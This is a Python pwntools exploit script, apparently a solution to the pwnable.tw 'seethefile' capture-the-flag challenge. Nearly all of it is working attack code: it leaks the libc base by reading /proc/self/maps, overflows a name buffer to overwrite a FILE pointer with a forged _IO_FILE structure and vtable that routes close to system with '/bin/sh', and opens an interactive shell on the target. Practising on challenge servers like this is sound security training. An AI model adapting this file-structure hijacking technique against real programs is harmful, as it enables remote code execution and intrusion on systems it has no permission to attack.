#!/usr/bin/env python3
from pwn import *
from dataclasses import dataclass

DWORD = 4
PAD = lambda n: b"a" * n
DUMMY = 0xdeadbeef

## what you get for sizeof(FILE) == 148
## *FILE + 148, will always be vtable
## struct _IO_FILE_plus
## {
##    _IO_FILE file;
##    const struct _IO_jump_t *vtable;
## }

FILE_IO_SIZE = 148
FILE_IO_PLUS_SIZE = FILE_IO_SIZE + DWORD

FILE_VTABLE_SIZE = DWORD * 24


elf = ELF("./seethefile_patched")
libc = ELF("./given/libc_32.so.6")
ld = ELF("./ld-2.23.so")
context.arch = "i386"
context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    p = remote("chall.pwnable.tw", 10200)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        gdb.attach(p)

class FakeFilePtr:
    def init(self, base, lock_addr, vtable_addr):
        self.base = base
        self.vtable = vtable_addr
        self.lock_addr = lock_addr

    def dump(self):
        # payload = p32(self.header)
        payload = b"/bin/sh\x00".ljust(0x48, b"\x00")
        payload += p32(self.lock_addr)
        payload = payload.ljust(FILE_IO_SIZE, b"\x00")
        payload += p32(self.vtable)
        return payload


class FakeFileVtable:
    def init(self, name2callee):
        name2offset = {"read": 0x38, "write": 0x3c, "seek": 0x40,
                      "close": 0x44}
        self.offset2callee = {}
        for func_name, callee in name2callee.items():
            log.info("replacing " + func_name + " with " + hex(callee))
            self.offset2callee[name2offset[func_name]] = callee

    def dump(self):
        payload = b"a" * DWORD * 24
        for offset, callee in self.offset2callee.items():
            payload = payload[:offset] + p32(callee) + payload[offset+DWORD:]
        return payload

@dataclass
class _IO_jump_t:
    null: int=0
    dummy: int=null
    dummy2: int=null
    finish: int=null
    overflow: int=null
    underflow: int=null
    uflow: int=null
    pbackfail: int=null
    xsputn: int=null
    xsgetn: int=null
    seekoff: int=null
    seekpos: int=null
    setbuf: int=null
    sync: int=null
    doallocate: int=null
    read: int=null
    write: int=null
    seek: int=null
    close: int=null
    stat: int=null
    showmanyc: int=null
    imbue: int=null

    def dump(self):
        pld = p32(self.dummy) + p32(self.dummy2)
        pld += p32(self.finish) + p32(self.overflow)
        pld += p32(self.underflow) + p32(self.uflow)
        pld += p32(self.pbackfail) + p32(self.xsputn)
        pld += p32(self.xsgetn) + p32(self.seekoff)
        pld += p32(self.seekpos) + p32(self.setbuf)
        pld += p32(self.sync) + p32(self.doallocate)
        pld += p32(self.read) + p32(self.write)
        pld += p32(self.seek) + p32(self.close)
        pld += p32(self.stat) + p32(self.showmanyc)
        pld += p32(self.imbue)
        return pld

class FakeIOLock:
    def init(self):
        # works fine for padding null bytes
        pass

    def dump(self):
        return p32(0) + p32(0) + p32(0)

def openfile(filename):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"What do you want to see :", filename)

def readfile():
    p.sendlineafter(b"Your choice :", b"2")
    msg = p.recvuntil(b"---------------MENU---------------")
    return b"Read Successful" in msg

def writefile():
    p.sendlineafter(b"Your choice :", b"3")
    content = p.recvn(399)
    return content


def leak_libc():
    openfile(b"/proc/self/maps")
    mem_map = b""
    while readfile():
        mem_map += writefile()

    areas = mem_map.split(b"\n")
    libc_map = None
    if args.REMOTE:
        is_libc = lambda s: b"/lib32/libc-2.23.so" in s
    else:
        is_libc = lambda s: libc.path.encode() in s

    for area in areas:
        if is_libc(area):
            libc_map = area
            break
    log.info(libc_map)
    libc_base = int(libc_map[:libc_map.find(b"-")].decode(), 16)
    return libc_base

def bufovfl():
    p.sendlineafter(b"Your choice :", b"5")

    data_name_buf = 0x804b260
    data_file_ptr = 0x804b280

    data_file_base = data_file_ptr + DWORD

    fsop = FileStructure()
    fsop.flags = u32(b"/bin")
    fsop._IO_read_ptr = u32(b"/sh\x00")
    fsop.vtable = data_file_base + len(bytes(fsop))
    fsop._lock = data_file_base + 2 * DWORD

    vtable = _IO_jump_t(close=libc.sym["system"])

    # this vuln allow as to gets at 0x804b260
    payload = PAD(0x20) + p32(data_file_base)
    payload += bytes(fsop)
    payload += vtable.dump()
    p.sendlineafter(b"Leave your name :", payload)


def exploit():
    libc.address = leak_libc()
    print("system:", hex(libc.symbols['system']))
    bufovfl()
    p.interactive()


if __name__ == "__main__":
    exploit()
